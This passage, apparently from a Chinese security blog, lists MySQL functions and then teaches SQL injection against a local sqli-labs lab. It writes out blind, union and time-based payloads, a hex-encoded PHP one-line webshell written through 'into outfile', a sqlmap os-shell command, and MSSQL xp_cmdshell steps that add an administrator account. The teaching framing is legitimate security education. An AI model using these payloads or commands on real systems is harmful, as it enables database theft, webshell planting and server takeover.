TIMESTAMP(&quot;2017-07-23&quot;, &quot;13:10:11&quot;); -&gt; 2017-07-23 13:10:11 TO_DAYS(d) 计算日期 d 距离 0000 年 1 月 1 日的天数 SELECT TO_DAYS(&#39;0001-01-01 01:01:01&#39;) -&gt; 366 WEEK(d) 计算日期 d 是本年的第几个星期，范围是 0 到 53 SELECT WEEK(&#39;2011-11-11 11:11:11&#39;) -&gt; 45 WEEKDAY(d) 日期 d 是星期几，0 表示星期一，1 表示星期二 SELECT WEEKDAY(&quot;2017-06-15&quot;); -&gt; 3 WEEKOFYEAR(d) 计算日期 d 是本年的第几个星期，范围是 0 到 53 SELECT WEEKOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt; 45 YEAR(d) 返回年份 SELECT YEAR(&quot;2017-06-15&quot;); -&gt; 2017 YEARWEEK(date, mode) 返回年份及第几周（0到53），mode 中 0 表示周天，1表示周一，以此类推 SELECT YEARWEEK(&quot;2017-06-15&quot;); -&gt; 201724 MySQL 高级函数17 BIN(x) 返回 x 的二进制编码 18 BINARY(s) 将字符串 s 转换为二进制字符串 19 CONNECTION_ID() 返回服务器的连接数 20 CURRENT_USER() 返回当前用户 SESSION_USER() 返回当前用户 SYSTEM_USER() 返回当前用户 USER() 返回当前用户 21 VERSION() 返回数据库的版本号 22 DATABASE() 返回当前数据库名 23 @@datadir 返回 数据库路径 24 @@version_compile_os 返回操作系统版本 Mysql通过system命令调用系统shell命令 判断是否存在SQL注入Boolean盲注盲注，就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的信息，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到了执行。 通过输入http://127.0.0.1/sqli/Less-1/?id=1 得到以下界面 然后输入 http://127.0.0.1/sqli/Less-5/?id=-1 我们得到下面的页面 当我们输入 http://127.0.0.1/sqli/Less-5/?id=1‘ 我们得到下面的页面 当输入正确时显示 You are in… 当我们显示语句错误时，就不显示任何数据 当我们的语法有错误时，就报出SQL语句错误 可以推断出代码： 12345678910`$result=mysql_query($sql);``$row = mysql_fetch_array($result);` if($row) &#123; `echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;;` ```&#125;` 通过构造一些判断语句，正式猜想；盲注一般用到的一些函数：ascii() 、substr() 、length()，exists()、concat()等 1.判断数据类型 MySQL数据库的特有的表是 information_schema.tables , access数据库特有的表是 msysobjects ； SQLServer 数据库特有的表是 sysobjects 。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库 判断数据类型： 12判断是否是 Mysql数据库http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from information_schema.tables) --+ 2 判断当前数据库名 1：判断当前数据库的长度，利用二分法http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5 –+ //正常显示http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;10 –+ //不显示任何数据http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;7 –+//正常显示http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;8 –+//不显示任何数据`` 大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为 8 122：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断判断数据库的第一个字符 大于114 不大于115 第一个字符是S 依次类推 union 注入union 联合查询适用于有显示列的注入； 通过order by来判断当前表的列数。得知表有 3列 “SELECT * FROM users WHERE id=’1’ order by 3 –+ ’’ LIMIT 0,1” 直接把前面 id=1 改成 id =-1 执行后面的语句 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,3 –+ 由上图可知，第二和第三个位置显示列信息 文件读写有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取； 文件写入只能利用 union 注入 union注入读取文件 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,load_file(“e:/read.txt”) –+ 把 e:/read.txt 转换成16进制 0x653a2f332e747874 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,load_file(0x653a2f726561642e747874) –+ union写入文件 利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,’‘ into outfile ‘e:/4.php’ –+ 可以将一句话木马转换成16进制的形式 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e into outfile ‘e:/44.php’ –+ E 盘下： sleep延时注入利用前提：页面上没有显示位，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，但是加入 sleep(5)条件之后，页面的返回速度明显慢了 5 秒。 优点：不需要显示位，不需要出错信息。缺点：速度慢，耗费大量时间 sleep 函数判断页面响应时间 if(判断条件，为true时执行，为false时执行) 我们可以构造下面的语句，判断条件是否成立。然后不断变换函数直到获取到我们想要的信息 //判断是否存在延时注入http://127.0.0.1/sqli/Less-1/?id=1&#39; and sleep(5) –+ //页面延时5秒响应 // 判断数据库的第一个字符的ascii值是否大于100，如果大于100，页面立即响应，如果不大于，页面延时5秒响应http://127.0.0.1/sqli/Less-1/?id=1&#39; and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) –+ 使用sqlmap直连数据库获取webshell直接连mysql数据库sqlmap -d “mysql://root:password@192.168.1.116:3306/mysql” –os-shell 如图所示，需要设置后端数据库的架构，服务器多为64位，可以先选择64位即输入数字2进行测试，如果不是，可以退出后再次运行并选择。 上传UDF文件选择系统架构后，sqlmap会自动上传udf文件到服务器提权位置，会显示一些信息。Sqlmap不管获取的shell是否成功都显示os-shell提示符。 执行命令 针对相应的系统执行一些命令来验证是否真正获取shell，执行ipconfig命令来查看网卡配置内容，在本例中成功获取shell。 MSSQL提权 SQL Server 2005 中引入的 xp_cmdshell 选项是服务器配置选项，该选项使系统管理员能够控制是否可以在系统上执行 xp_cmdshell 扩展存储过程。默认情况下，xp_cmdshell 选项在新安装的软件上处于禁用状态，但是可以使用基于策略的管理或运行 sp_configure 系统存储过程来启用它。当用户拿到了sa的权限或者是具有数据库管理员权限的其他用户，可以通过启用xp_cmdshell来执行系统命令，从而完成提权。 操作步骤： 利用webshell查看网站的数据库连接文件，发现是用sa用户连接的，并获取到了sa用户的密码 利用获取到的数据库信息，连接MSSQL数据库 启用xp_cmdshell及Xplog70.dll：use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’) exec master.dbo.xp_cmdshell ‘whoami’ exec master.dbo.xp_cmdshell ‘net user zsc66 zsc0810 /ad &amp; net localgroup administrators zsc66 /ad’ 创建密码为zsc0810的 zsc66 用户 并添加到管理员 参考资料https://www.runoob.com/mysql/mysql-functions.html https://blog.csdn.net/qq_36119192/article/details/81987834 https://www.freebuf.com/articles/system/163144.html https://www.freebuf.com/news/151634.html]]></content>
  </entry>
</search>
